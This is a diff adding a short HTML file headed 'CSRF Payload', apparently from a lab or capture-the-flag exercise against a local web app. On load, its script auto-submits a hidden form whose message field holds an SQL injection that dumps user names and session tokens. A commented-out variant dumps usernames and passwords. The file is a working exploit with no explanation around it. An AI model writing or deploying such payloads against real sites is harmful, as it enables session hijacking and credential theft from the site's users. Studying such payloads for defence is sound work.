@@ -1,0 +1,13 @@
+<html>
+<body>
+    <h1>CSRF Payload</h1>
+    <form id="csrfForm" action="http://127.0.0.1:5000/posts" method="POST">
+        <input type="hidden" name="message" value="1&#39;, 1&#41;, ((SELECT GROUP_CONCAT(user || ':' || token, '&#8249;br>') FROM sessions), 1)--">
+        <!-- <input type="hidden" name="message" value="1', 1&#41;, ((SELECT GROUP_CONCAT(id || ',' || username || ':' || password, '&#8249;br>') FROM users), 1)--"> -->
+    </form>
+    <script>
+        // Automatically submit the form when the page loads
+        document.getElementById('csrfForm').submit();
+    </script>
+</body>
+</html>
